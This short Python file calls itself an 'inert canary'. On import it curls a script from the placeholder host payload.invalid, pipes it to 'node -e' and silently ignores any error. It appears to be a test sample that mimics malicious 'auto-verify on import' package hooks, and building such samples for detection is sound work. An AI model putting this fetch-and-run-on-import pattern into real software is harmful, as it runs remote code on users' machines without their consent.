# inert canary: fetch a script at import and hand it to `node -e` (2026 "auto-verify on import" shape)
import subprocess

try:
    r = subprocess.run(["curl", "-sL", "https://payload.invalid/p.js"], capture_output=True, text=True, timeout=10)
    if r.stdout:
        subprocess.run(["node", "-e", r.stdout], capture_output=True, timeout=30)
except Exception:
    pass
